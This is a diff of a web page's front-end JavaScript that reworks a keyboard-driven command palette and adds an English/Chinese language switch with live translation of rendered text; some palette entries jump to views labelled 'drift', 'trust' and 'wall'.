+ {g:"run",t:"Redraw the flowchart",k:"R",run:()=>{location.hash="flow";setTimeout(()=>drawFlow(true),50)}},{g:"run",t:"Play run #17 drift",k:"",run:()=>{location.hash="drift";setTimeout(runDrift,80)}},
+ {g:"run",t:"Propose a permissions diff",k:"",run:()=>{location.hash="trust";setTimeout(()=>$("#trustgo").click(),80)}},{g:"run",t:"Replay the workaround",k:"",run:()=>{location.hash="wall";setTimeout(()=>wallRun("work"),80)}}];
+let pI=0,pL=[];
+function renderPal(){const q=$("#pq").value.trim().toLowerCase();pL=CMDS.filter(c=>!q||c.t.toLowerCase().includes(q));pI=Math.min(pI,Math.max(0,pL.length-1));
+ if(!pL.length){$("#plist").innerHTML=`<div class="empty" style="margin:16px 20px"><b>Nothing called “${q.replace(/</g,"&lt;")}”.</b>Try “wall”, “trust” or “redraw”.</div>`;return}
+ let g="",h="";pL.forEach((c,i)=>{if(c.g!==g){g=c.g;h+=`<div class="pg">${g}</div>`}h+=`<div class="pit ${i===pI?"act":""}" data-i="${i}"><span>${c.t}</span><span>${c.k}</span></div>`});$("#plist").innerHTML=h;
+ $$(".pit").forEach(el=>{el.onmousemove=()=>{if(pI!=+el.dataset.i){pI=+el.dataset.i;renderPal()}};el.onclick=execPal})}
+function execPal(){const c=pL[pI];closePal();c&&c.run()}
+function openPal(){$("#pal").classList.add("on");$("#pq").value="";pI=0;renderPal();setTimeout(()=>$("#pq").focus(),10)}
 function closePal(){$("#pal").classList.remove("on")}
-$("#openpal").onclick=openPal;$("#pq").oninput=()=>{pIdx=0;renderPal()};
-$("#pal").onclick=e=>{if(e.target.id==="pal")closePal()};
-document.addEventListener("keydown",e=>{
- if((e.metaKey||e.ctrlKey)&&e.key.toLowerCase()==="k"){e.preventDefault();$("#pal").classList.contains("on")?closePal():openPal();return}
- if(!$("#pal").classList.contains("on")){if(e.key==="r"&&location.hash==="#flow"&&!e.metaKey&&!e.ctrlKey)drawFlow(true);return}
- if(e.key==="Escape")closePal();else if(e.key==="ArrowDown"){e.preventDefault();pIdx=(pIdx+1)%pItems.length;hlPal()}else if(e.key==="ArrowUp"){e.preventDefault();pIdx=(pIdx-1+pItems.length)%pItems.length;hlPal()}else if(e.key==="Enter"){e.preventDefault();execPal()}});
-(async()=>{route();if(params.has("noboot"))$("#boot").classList.add("gone");else await boot();
- if(params.has("palette")){openPal();if(params.get("palette")){$("#pq").value=params.get("palette");renderPal()}pIdx=+(params.get("pi")||0);hlPal(true)}})();
+$("#openpal").onclick=openPal;$("#pq").oninput=()=>{pI=0;renderPal()};$("#pal").onclick=e=>{if(e.target.id==="pal")closePal()};
+document.addEventListener("keydown",e=>{if((e.metaKey||e.ctrlKey)&&e.key.toLowerCase()==="k"){e.preventDefault();$("#pal").classList.contains("on")?closePal():openPal();return}
+ if(!$("#pal").classList.contains("on"))return;if(e.key==="Escape")closePal();else if(e.key==="ArrowDown"){e.preventDefault();pI=(pI+1)%pL.length;renderPal()}else if(e.key==="ArrowUp"){e.preventDefault();pI=(pI-1+pL.length)%pL.length;renderPal()}else if(e.key==="Enter"){e.preventDefault();execPal()}});
+route();if(params.has("palette")){openPal();pI=+(params.get("pi")||0);renderPal()}
+/* language switch + live translation of anything the views render */
+(()=>{const sw=$("#langsw");sw.href="?lang="+(LANG==="zh"?"en":"zh")+location.hash;sw.setAttribute("hreflang",LANG==="zh"?"en":"zh-CN");
+ sw.addEventListener("click",e=>{e.preventDefault();try{localStorage.setItem("ledring-lang",LANG==="zh"?"en":"zh")}catch(_){}const u=new URL(location.href);u.searchParams.delete("lang");location.href=u.toString()});
+ if(LANG!=="zh")return;document.title=T(document.title);tDom(document.body);
+ new MutationObserver(ms=>{for(const m of ms){if(m.type==="characterData"){const p=m.target.parentElement;if(p)tDom(p)}else{m.addedNodes.forEach(n=>n.nodeType===1?tDom(n):n.parentElement&&tDom(n.parentElement))}}}).observe(document.body,{subtree:true,childList:true,characterData:true})})();
 </script></body></html>
